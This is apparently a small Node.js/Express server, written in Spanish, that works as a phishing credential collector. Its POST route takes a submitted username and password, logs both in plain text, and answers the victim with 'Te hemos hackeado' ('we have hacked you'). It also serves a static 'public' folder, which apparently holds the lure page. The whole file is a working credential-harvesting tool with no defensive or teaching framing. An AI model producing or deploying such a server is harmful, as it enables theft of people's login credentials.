const colors=require('colors')
const express=require('express')
const app=express()
const morgan=require('morgan')
const port=3000
app.use(morgan('dev'))
app.use(express.json())
app.listen(port,()=>{
//
console.log(`servidor en puerto ${port}`.yellow)
})
//
app.set('view engine','ejs')
//
app.post('/',(req,res)=>{
let Password=req.body.Password,
Username=req.body.Username
console.log(` El usurio es :${Username}
La contraseña es :${Password}
`);
res.send('Te hemos hackeado')
})
ceros='0'
app.use(express.static('public'))
